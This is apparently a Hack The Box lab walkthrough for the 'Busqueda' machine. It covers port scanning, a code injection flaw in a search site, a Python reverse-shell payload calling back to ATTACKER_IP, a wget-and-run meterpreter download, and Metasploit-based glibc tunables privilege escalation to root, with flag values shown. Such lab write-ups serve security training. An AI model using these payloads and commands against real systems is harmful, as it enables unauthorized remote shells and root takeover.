
# HTB Walkthrough - Busqueda

**Machine Name**: Busqueda  
**Target IP**: 10.129.178.117  
<img width="1270" height="764" alt="webpage" src="https://github.com/user-attachments/assets/2423fc7a-e049-433a-a7da-4571c4044621" />

---

## 🧭 Enumeration

### 🔍 Nmap Scan

```bash
nmap -sV -sC -oA nmap/Busqueda 10.129.178.117
```
<img width="980" height="304" alt="nmap" src="https://github.com/user-attachments/assets/5c64ec6c-8f01-4d71-9963-5e764a474c20" />

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
```

> Add to /etc/hosts:
```
10.129.178.117  searcher.htb
```

---

## 🌐 Web Enumeration

- Browsing to `http://searcher.htb/` brings up a custom search engine.
<img width="794" height="214" alt="poweredby" src="https://github.com/user-attachments/assets/84f38956-68b5-40e2-95ae-65d41d4f2d54" />

- The site takes input and appends it to a search URL (e.g., Bing).
- Input like `'+'` shows it's vulnerable to code injection.
<img width="1016" height="300" alt="test" src="https://github.com/user-attachments/assets/8cb3a1d5-2232-412f-98a4-92960a36b4e6" />
<img width="816" height="48" alt="result" src="https://github.com/user-attachments/assets/dfc8fee6-9d23-488f-8d4f-152322b0be2c" />

### 🧪 Exploiting Code Injection

Python-based reverse shell payload:

```python
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

Setup reverse shell listener:

```bash
nc -nlvp 9999
```

- Submit payload via search input → Shell received.
<img width="882" height="114" alt="reverseshell" src="https://github.com/user-attachments/assets/09fc6c6e-e688-4013-8091-d490cb815233" />

Stabilize shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
```

---

## 🧑‍💻 User Flag

```bash
cat user.txt
# 54a7ce58f5cb31e7226f192a4d687df1
```
<img width="800" height="54" alt="userflag" src="https://github.com/user-attachments/assets/8f0acdc2-b6aa-4fbe-8ebd-92429400d60e" />

---

## ⬆️ Privilege Escalation

### 🔍 No sudo or SUID escalation found.

Use Metasploit local exploit suggester:

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter_reverse_tcp
set LHOST <ATTACKER_IP>
run

# On victim:
wget http://<ATTACKER_IP>:8888/meterpreter.elf
chmod +x meterpreter.elf
./meterpreter.elf

# In meterpreter:
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```
<img width="1234" height="648" alt="recon" src="https://github.com/user-attachments/assets/55f6cc74-a7b9-4e3d-b2d6-b4c5cf0ae583" />

### Exploitable Vulnerabilities:

- CVE-2022-0847 (DirtyPipe) → Failed
- CVE-2023-0386 (OverlayFS) → Failed
- glibc_tunables_priv_esc → ✅ **Succeeded**

```bash
use exploit/linux/local/glibc_tunables_priv_esc
set SESSION 1
run
```
<img width="1010" height="388" alt="exploit" src="https://github.com/user-attachments/assets/26a05a43-4fd8-4c77-9bf0-8cf2e8789821" />

```bash
meterpreter > getuid
# Server username: root
```

---

## 🔐 Root Flag
<img width="660" height="98" alt="rootflag" src="https://github.com/user-attachments/assets/1511eaf7-9e36-4b42-9855-c18765f3b7eb" />

```bash
cat /root/root.txt
# a5e11ed334c867dcbc276a41796289f6
```

---

✅ **Root shell obtained via glibc tunables LPE.**
